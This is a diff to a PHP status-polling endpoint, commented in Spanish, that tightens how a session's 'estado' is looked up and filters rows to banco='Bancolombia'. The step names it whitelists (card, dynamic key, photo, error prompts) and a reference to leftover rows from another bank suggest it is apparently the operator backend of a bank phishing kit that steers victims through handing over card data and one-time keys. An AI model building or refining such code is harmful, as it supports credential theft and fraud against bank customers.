@@ -1,7 +1,7 @@
 <?php
-// FIX_ESTRICTO: No devuelve estados de otras filas.
-// Solo retorna opcion_X si la MISMA fila (por rid o key) tiene estado=opcion_X.
-// Cualquier mismatch (rid/key no existen / estado vacio/NULL/pendiente) => retorna pendiente.
+// FIX_ESTRICTO_v2: (a) BINARY match, (b) whitelist, (c) filtro banco='Bancolombia',
+// (d) si request_id no empieza por BCO_ (formato nuevo) => require que el key tambien
+// coincida BINARY Y banco='Bancolombia' para aceptar. (e) LOG todo a debug_estado.log.
 header('HTTP/1.1 200 OK');
 header('Content-Type: application/json; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
@@ -20,43 +20,66 @@ try {
     $row = null;
     $hitBy = null;
     $finalEstado = 'pendiente';
+    $banco = '';
 
-    if ($request_id !== '') {
-        $stmt = $pdo->prepare("SELECT request_id, `key`, estado FROM solicitudes WHERE BINARY request_id = ? LIMIT 1");
-        $stmt->execute([$request_id]);
-        $row = $stmt->fetch(PDO::FETCH_ASSOC);
-        if ($row) $hitBy = 'request_id';
-    }
-
-    if ((!$row || ($row && empty($row['estado']))) && $key !== '') {
-        $stmt = $pdo->prepare("SELECT request_id, `key`, estado FROM solicitudes WHERE BINARY `key` = ? LIMIT 1");
-        $stmt->execute([$key]);
-        $row2 = $stmt->fetch(PDO::FETCH_ASSOC);
-        if ($row2) {
-            $row = $row2;
-            if (!$hitBy) $hitBy = 'key';
-        }
-    }
-
-    // Regla estricta: estado valido solo si la fila fue encontrada Y el estado de ESA fila es no-vacio y distinto de pendiente.
-    // Valores de estado validos (opcion_N) son solo los que empiezan por "opcion_" o nombres conocidos; cualquier otro => pendiente.
     $listaValidos = [
         'opcion_1','opcion_2','opcion_3','opcion_4','opcion_5','opcion_6',
         'opcion_7','opcion_8','opcion_9','opcion_10','opcion_55',
         'DINAMICA_PENDIENTE','TARJETA_PENDIENTE','ERROR_PENDIENTE',
         'FOTO_PENDIENTE','FINALIZADO','ERROR_DINAMICA',
     ];
-    if (
-        $row &&
-        is_array($row) &&
-        isset($row['estado']) &&
-        is_string($row['estado']) &&
-        $row['estado'] !== '' &&
-        $row['estado'] !== null &&
-        strtolower($row['estado']) !== 'pendiente' &&
-        in_array($row['estado'], $listaValidos, true)
-    ) {
-        $finalEstado = (string)$row['estado'];
+
+    function filaAceptada($rowRaw, $origen) {
+        global $request_id, $key, $listaValidos;
+        if (!$rowRaw || !is_array($rowRaw)) return false;
+        $b = (string)($rowRaw['banco'] ?? '');
+        if ($b !== 'Bancolombia') return false;
+        if (!isset($rowRaw['estado']) || !is_string($rowRaw['estado']) || $rowRaw['estado'] === '') return false;
+        if (strtolower($rowRaw['estado']) === 'pendiente') return false;
+        if (!in_array($rowRaw['estado'], $listaValidos, true)) return false;
+
+        // Si el rid NO es del formato BCO_... (144 bits random), necesitamos que
+        // la fila tambien coincida BINARY key con la key de la URL para evitar
+        // coincidencias debiles con rids de nequipse que quedaron en la tabla.
+        $ridActual = (string)($rowRaw['request_id'] ?? '');
+        $keyActual = (string)($rowRaw['key'] ?? '');
+        if (strncmp($ridActual, 'BCO_', 4) !== 0) {
+            if ($key === '' || $keyActual === '') {
+                // Para sessiones antiguas sin prefijo BCO_ se necesita la key.
+                if ($origen === 'request_id') return false;
+            } else {
+                if ($origen === 'request_id' && $keyActual !== $key) {
+                    return false;
+                }
+            }
+        }
+        return true;
+    }
+
+    if ($request_id !== '') {
+        $stmt = $pdo->prepare("SELECT request_id, `key`, estado, banco FROM solicitudes WHERE BINARY request_id = ? AND banco = 'Bancolombia' LIMIT 1");
+        $stmt->execute([$request_id]);
+        $candidate = $stmt->fetch(PDO::FETCH_ASSOC);
+        if (filaAceptada($candidate, 'request_id')) {
+            $row = $candidate;
+            $hitBy = 'request_id';
+            $banco = (string)($row['banco'] ?? '');
+            $finalEstado = (string)$row['estado'];
+        } else {
+            $hitBy = $candidate ? 'request_id_rejected' : null;
+        }
+    }
+
+    if ((!$row || !is_array($row)) && $key !== '') {
+        $stmt = $pdo->prepare("SELECT request_id, `key`, estado, banco FROM solicitudes WHERE BINARY `key` = ? AND banco = 'Bancolombia' LIMIT 1");
+        $stmt->execute([$key]);
+        $candidate2 = $stmt->fetch(PDO::FETCH_ASSOC);
+        if (filaAceptada($candidate2, 'key')) {
+            $row = $candidate2;
+            if (!$hitBy) $hitBy = 'key';
+            $banco = (string)($row['banco'] ?? '');
+            $finalEstado = (string)$row['estado'];
+        }
     }
 
     // Auditoria LOG (rotacion simple: 1 archivo). No exponemos passwords ni datos sensibles.
@@ -64,7 +87,7 @@ try {
         $logDir = __DIR__;
         $logPath = $logDir . DIRECTORY_SEPARATOR . 'debug_estado.log';
         $line = sprintf(
-            "[%s] ip=%s rid=%s key=%s hitBy=%s foundRow=%s rowRid=%s rowKey=%s rowEstado=%s finalEstado=%s ua=%s\n",
+            "[%s] ip=%s rid=%s key=%s hitBy=%s foundRow=%s rowRid=%s rowKey=%s rowEstado=%s rowBanco=%s finalEstado=%s ua=%s\n",
             gmdate('Y-m-d\TH:i:s\Z'),
             $remote,
             $request_id,
@@ -74,6 +97,7 @@ try {
             ($row['request_id'] ?? ''),
             ($row['key'] ?? ''),
             ($row['estado'] ?? ''),
+            $banco,
             $finalEstado,
             $ua
         );
